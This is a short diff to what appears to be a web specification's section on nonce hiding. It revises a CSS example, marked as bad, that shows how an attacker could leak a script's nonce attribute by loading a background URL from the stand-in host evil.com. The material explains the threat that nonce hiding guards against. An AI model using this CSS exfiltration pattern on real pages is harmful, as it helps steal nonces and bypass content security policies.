@@ -75,8 +75,10 @@ Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms
 from content attributes like this:
 
 ```css example-bad
-script[nonce~="whatever"] {
-  background: url("https://evil.com/nonce?whatever");
+script[nonce]::after {
+  content: attr(nonce);
+  color: transparent;
+  background: url("https://evil.com/steal-nonce?nonce=" attr(nonce));
 }
 ```
 
